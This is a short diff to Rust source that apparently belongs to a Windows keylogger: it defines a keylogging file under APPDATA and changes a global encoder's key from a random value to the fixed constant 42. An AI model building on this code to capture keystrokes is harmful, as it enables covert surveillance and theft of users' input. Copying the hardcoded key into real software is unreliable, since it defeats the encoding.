@@ -63,7 +63,7 @@ use windows::Win32::System::Diagnostics::ToolHelp::{
 
 // creates a global encoder
 //randomizes key
-static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new( StdRng::from_os_rng().r#gen())));
+static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new( 42)));
 
 static KEYLOGGING_FILE: Lazy<PathBuf> = Lazy::new(|| {
     let appdata = std::env::var("APPDATA").expect("APPDATA not found");
